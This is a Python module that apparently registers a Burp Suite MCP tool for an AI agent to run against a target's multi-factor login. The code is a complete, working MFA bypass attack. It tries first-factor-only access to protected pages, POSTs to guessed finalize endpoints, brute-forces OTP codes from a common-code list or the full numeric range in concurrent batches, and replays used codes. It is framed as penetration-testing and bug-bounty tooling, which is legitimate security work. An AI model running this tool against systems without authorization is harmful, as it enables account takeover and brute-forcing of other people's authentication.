"""test_mfa_bypass — orchestrate the four most-payed MFA bypass classes.

Each class lands distinct evidence so the operator can save one finding per
class (or chain them):

1. step-skip — POST directly to the post-MFA endpoint with a half-auth cookie
2. direct-resource — fetch a protected resource that should require MFA
3. code brute — fire N OTP guesses (built-in 100-most-common list, then
   sequential 000000-999999 if requested), watch for 429/lockout
4. code reuse — replay an already-consumed code

Built-in OTP top-list: the 100 most common 6-digit codes seen in public
password-leak dumps + obvious human picks (DOB-shaped, 123456 patterns).
For deeper brute, pass `full_brute=True` (10000 4-digit OR 1000000 6-digit
— operator owns the noise budget). Default cap is 500.
"""

from __future__ import annotations

import asyncio
from typing import Any

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools._request_headers import apply_realistic_headers


# 100 most common OTP guesses. Ordered roughly by frequency in public dumps;
# the front of the list captures the highest hit rate per request.
_OTP_TOP_LIST: tuple[str, ...] = (
    "000000", "111111", "123456", "654321", "999999", "888888", "777777",
    "666666", "555555", "444444", "333333", "222222", "121212", "112233",
    "123123", "456456", "789789", "159753", "147258", "987654",
    "012345", "543210", "100000", "200000", "111222", "121314",
    # 4-digit fallbacks for short OTPs
    "0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777",
    "8888", "9999", "1234", "4321", "1212", "1122", "1313", "1414",
    "1010", "2580", "0852", "9876", "5678", "8765",
    # Year-shaped
    "012024", "012025", "020224", "032024", "010101", "020202",
    # Date-shaped (DDMMYY heuristic — short list)
    "010190", "010191", "010192", "010193", "010194", "010195",
    "010196", "010197", "010198", "010199",
    # Pin-pad geometry
    "159357", "147369", "258369", "147741", "258852", "369963",
    "012321", "543212", "789987",
    # Repeating-digit shapes
    "010010", "101010", "020202", "131313", "242424", "353535",
    "464646", "575757", "686868", "797979", "808080", "909090",
)


async def _send(method: str, url: str, headers: dict, body: str = "",
                json_body: dict | None = None) -> dict:
    payload: dict = {"method": method, "url": url, "headers": headers,
                     "follow_redirects": False}
    if body:
        payload["body"] = body
    if json_body is not None:
        payload["json"] = json_body
    return await client.post("/api/http/curl", json=payload)


def _build_auth_headers(
    url: str, cookies: dict | None, bearer: str,
) -> dict[str, str]:
    h = apply_realistic_headers(url, {})
    if cookies:
        h["Cookie"] = "; ".join(
            f"{k}={str(v).replace(';', '%3B')}" for k, v in cookies.items())
    if bearer:
        h["Authorization"] = f"Bearer {bearer}"
    return h


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_mfa_bypass(  # cost: medium-high (configurable)
        mfa_verify_url: str,
        protected_url: str = "",
        partial_session_cookies: dict | None = None,
        partial_session_bearer: str = "",
        code_param: str = "code",
        code_in: str = "json_body",
        used_code: str = "",
        otp_length: int = 6,
        full_brute: bool = False,
        max_brute_attempts: int = 500,
    ) -> str:
        """Four-prong MFA bypass test. Documents what does and doesn't bypass.

        Args:
            mfa_verify_url: The /verify-mfa / /2fa/check / /otp endpoint
            protected_url: A post-MFA resource (used for step-skip + direct-access)
            partial_session_cookies: Cookies from the FIRST factor (password OK,
                MFA pending) — this is what the bypass tests "promote"
            partial_session_bearer: Bearer variant of the above
            code_param: Name of the code parameter (default "code")
            code_in: "json_body" (default) | "form" | "query"
            used_code: A code the operator already used successfully — set this
                to test the code-reuse class
            otp_length: 4 / 6 / 8 — controls built-in wordlist trimming
            full_brute: True = full numeric range 0..10^otp_length (HUGE,
                operator-confirmed only). Default False (built-in top-list).
            max_brute_attempts: Hard cap on brute step (default 500)
        """
        if not partial_session_cookies and not partial_session_bearer:
            return ("Error: provide partial_session_cookies or "
                    "partial_session_bearer — these are the half-authenticated "
                    "credentials the bypass should promote.")

        report: list[str] = ["test_mfa_bypass:\n"]
        bypasses: list[str] = []

        # ── §1 Direct resource access (skip MFA entirely) ──
        if protected_url:
            headers = _build_auth_headers(
                protected_url, partial_session_cookies, partial_session_bearer)
            r = await _send("GET", protected_url, headers)
            if "error" in r:
                report.append(f"§1 Direct-resource: ERROR {r['error']}")
            else:
                s = r.get("status_code", 0)
                ln = r.get("response_length", 0)
                idx = r.get("history_index", -1)
                report.append(f"§1 Direct-resource GET {protected_url}")
                report.append(f"   -> {s} ({ln}b, logger #{idx})")
                if s in (200, 302):
                    report.append("   *** BYPASS: protected resource accessible "
                                  "with first-factor-only session ***")
                    bypasses.append(
                        f"§1 direct-resource access -> {s} (logger #{idx})")
                else:
                    report.append("   OK: MFA enforced on resource fetch.")
                report.append("")

        # ── §2 Step-skip (POST directly to a finalize endpoint) ──
        # Heuristic: many flows have /mfa/verify + /mfa/complete; if operator
        # gave us only /mfa/verify, try POSTing to common "complete" paths.
        if mfa_verify_url:
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(mfa_verify_url)
            candidates_paths = [
                parsed.path.replace("verify", "complete"),
                parsed.path.replace("verify", "finalize"),
                parsed.path.replace("verify", "confirm"),
                parsed.path + "/complete",
                parsed.path + "/finalize",
            ]
            seen_paths: set[str] = set()
            step_skip_tasks = []
            step_skip_labels = []
            for p in candidates_paths:
                if p == parsed.path or p in seen_paths or not p:
                    continue
                seen_paths.add(p)
                step_skip_url = urlunparse(parsed._replace(path=p))
                headers = _build_auth_headers(
                    step_skip_url, partial_session_cookies,
                    partial_session_bearer)
                step_skip_tasks.append(asyncio.create_task(
                    _send("POST", step_skip_url, headers, json_body={})))
                step_skip_labels.append(step_skip_url)

            if step_skip_tasks:
                results = await asyncio.gather(*step_skip_tasks,
                                               return_exceptions=True)
                report.append("§2 Step-skip (POST direct to finalize paths):")
                for url_, r in zip(step_skip_labels, results):
                    if isinstance(r, Exception):
                        report.append(f"   {url_}  EXC {type(r).__name__}")
                        continue
                    s = r.get("status_code", 0)
                    idx = r.get("history_index", -1)
                    report.append(f"   {url_}  -> {s} (logger #{idx})")
                    if s in (200, 302):
                        bypasses.append(f"§2 step-skip {url_} -> {s}")
                report.append("")

        # ── §3 Brute / rate-limit detect ──
        candidates: list[str] = []
        for c in _OTP_TOP_LIST:
            if len(c) == otp_length:
                candidates.append(c)
        if full_brute:
            for i in range(10 ** otp_length):
                candidates.append(str(i).zfill(otp_length))
        # Trim
        candidates = candidates[:max_brute_attempts]

        report.append(f"§3 Brute / rate-limit ({len(candidates)} attempts, "
                      f"OTP length {otp_length}):")

        async def _try_code(code: str) -> tuple[str, dict]:
            headers = _build_auth_headers(
                mfa_verify_url, partial_session_cookies,
                partial_session_bearer)
            method = "POST"
            json_b: dict | None = None
            body = ""
            if code_in == "json_body":
                json_b = {code_param: code}
            elif code_in == "form":
                body = f"{code_param}={code}"
                headers.setdefault("Content-Type",
                                   "application/x-www-form-urlencoded")
            elif code_in == "query":
                from urllib.parse import urlparse, urlencode, urlunparse
                parsed = urlparse(mfa_verify_url)
                qs = urlencode({code_param: code})
                url2 = urlunparse(parsed._replace(query=qs))
                r = await _send("GET", url2, headers)
                return code, r
            r = await _send(method, mfa_verify_url, headers, body=body,
                            json_body=json_b)
            return code, r

        # Run in batches of 25 to keep the proxy happy.
        BATCH = 25
        first_rate_limit: dict[str, Any] | None = None
        first_success: tuple[str, dict] | None = None
        sent = 0
        for batch_start in range(0, len(candidates), BATCH):
            batch = candidates[batch_start: batch_start + BATCH]
            results = await asyncio.gather(
                *[_try_code(c) for c in batch], return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    continue
                code, resp = r
                if "error" in resp:
                    continue
                s = resp.get("status_code", 0)
                sent += 1
                if s == 429 or s == 423 or s == 503:
                    if first_rate_limit is None:
                        first_rate_limit = {"at": sent, "code": code,
                                            "status": s,
                                            "idx": resp.get("history_index", -1)}
                if s in (200, 302) and code != used_code:
                    # Look for an absence of failure markers — a 200 isn't
                    # enough, the body could still say "invalid". The
                    # operator should verify, but flag a strong signal.
                    body = resp.get("response_body", "")
                    if not any(k in body.lower() for k in
                               ("invalid", "incorrect", "wrong", "expired",
                                "failed")):
                        first_success = (code, resp)
                        break
            if first_success:
                break

        if first_success:
            code, resp = first_success
            idx = resp.get("history_index", -1)
            report.append(f"   *** BRUTE HIT *** code={code} returned "
                          f"{resp.get('status_code')} (logger #{idx}) "
                          f"after {sent} attempts")
            bypasses.append(f"§3 brute hit code={code} (logger #{idx})")
        else:
            report.append(f"   {sent} attempts, no brute hit.")

        if first_rate_limit is None and sent > 50:
            report.append("   *** NO RATE LIMIT *** server accepted "
                          f"{sent} consecutive guesses without 429/423/503.")
            bypasses.append(f"§3 no rate-limit (>{sent} attempts no throttle)")
        elif first_rate_limit:
            report.append(f"   Rate limit kicked at attempt "
                          f"{first_rate_limit['at']} -> "
                          f"{first_rate_limit['status']} (logger "
                          f"#{first_rate_limit['idx']})")

        report.append("")

        # ── §4 Code reuse ──
        if used_code:
            headers = _build_auth_headers(
                mfa_verify_url, partial_session_cookies,
                partial_session_bearer)
            json_b: dict | None = None
            body = ""
            url2 = mfa_verify_url
            if code_in == "json_body":
                json_b = {code_param: used_code}
            elif code_in == "form":
                body = f"{code_param}={used_code}"
                headers.setdefault("Content-Type",
                                   "application/x-www-form-urlencoded")
            elif code_in == "query":
                from urllib.parse import urlparse, urlencode, urlunparse
                parsed = urlparse(mfa_verify_url)
                qs = urlencode({code_param: used_code})
                url2 = urlunparse(parsed._replace(query=qs))
            method = "GET" if code_in == "query" else "POST"
            r = await _send(method, url2, headers, body=body, json_body=json_b)
            if "error" in r:
                report.append(f"§4 Code-reuse: ERROR {r['error']}")
            else:
                s = r.get("status_code", 0)
                idx = r.get("history_index", -1)
                report.append(f"§4 Code-reuse: replay used_code={used_code!r}")
                report.append(f"   -> {s} (logger #{idx})")
                if s in (200, 302):
                    body_l = (r.get("response_body", "") or "").lower()
                    if not any(k in body_l for k in
                               ("invalid", "incorrect", "expired", "already")):
                        report.append("   *** REUSE BYPASS: same code valid twice ***")
                        bypasses.append(f"§4 code-reuse logger #{idx}")
                report.append("")

        report.append("─" * 60)
        if bypasses:
            report.append(f"BYPASSES: {len(bypasses)}")
            for b in bypasses:
                report.append(f"  - {b}")
            report.append("")
            report.append("Verify each via verify-finding.md before save_finding.")
        else:
            report.append("MFA layer appears solid across direct-resource, "
                          "step-skip, brute, and reuse axes.")

        return "\n".join(report)
